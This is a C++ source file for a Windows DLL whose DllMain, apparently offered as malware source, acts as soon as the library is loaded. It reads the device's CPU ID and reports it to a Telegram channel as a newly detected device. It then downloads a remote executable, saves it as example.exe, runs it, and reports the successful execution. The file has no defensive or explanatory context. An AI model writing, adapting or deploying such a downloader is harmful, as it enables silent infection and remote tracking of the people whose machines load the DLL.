#include "pch.h"
#include "main.h"
#include "functions.cpp"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	if (dwReasonForCall == DLL_PROCESS_ATTACH)
	{
		char cpuID[50];
		GetCPUID(cpuID, sizeof(cpuID));
		char message[256];
		snprintf(message, sizeof(message), "*New device Detected:*\n`%s`", cpuID);
		sendMessageToTelegram(message);

		std::string filepath = "example.exe";
		if (downloadRemoteFile(DOWNLOAD_REMOTE_EXE, filepath)) {
			if (runDownloadedFile(filepath)) {
				snprintf(message, sizeof(message), "*File successfully downloaded and executed on device*\n`%s`", cpuID);
				sendMessageToTelegram(message);
			}
		}
	}
	return TRUE;
}

// written by zile42o
// thanks to evgen 1137